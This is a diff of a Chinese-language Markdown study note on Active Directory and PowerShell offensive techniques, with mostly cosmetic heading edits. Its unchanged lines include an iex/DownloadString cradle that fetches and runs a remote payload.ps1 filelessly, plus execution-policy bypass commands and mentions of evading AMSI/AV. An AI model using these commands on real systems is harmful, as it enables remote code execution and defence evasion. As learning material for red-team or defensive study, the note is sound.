@@ -246,16 +246,16 @@ Enterprise Admins 群組擁有整個 Forest 層級的最高權限。
 
 ---
 
-PowerShell 基礎操作 : 
+PowerShell 基礎操作 
 
-載入 AD 模組
+載入 AD 模組 :
 
 ```bash=
 Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
 Get-Command -Module ActiveDirectory
 ```
 
-用途：
+重點：
 - 使用 AD 相關 cmdlet
 - 進行 Domain Enumeration
 
@@ -265,13 +265,11 @@ Get-Command -Module ActiveDirectory
 iex (New-Object Net.WebClient).DownloadString('http://www.webserver/payload.ps1')
 ```
 
-概念：
+重點：
 - 記憶體載入（fileless execution）
 - 不落地執行腳本
 
 PowerShell 監控機制（Detection Surface）
-
-理解防禦面，才能理解攻擊面。
 
 系統層監控
 - System-wide transcription
@@ -297,7 +295,8 @@ powershell -c <cmd>
 powershell -encodedcommand <base64>
 $env:PSExecutionPolicyPreference="bypass"
 ```
-重點理解：
+
+重點：
 - Execution Policy 不是安全邊界
 - 真正的限制來自 AMSI / CLM / AV
 
@@ -329,6 +328,8 @@ PowerShell 本質是 .NET。
 - Codecepticon（各種 PoC 與混淆實驗）
 
 ---
+
+
 
 
 ---
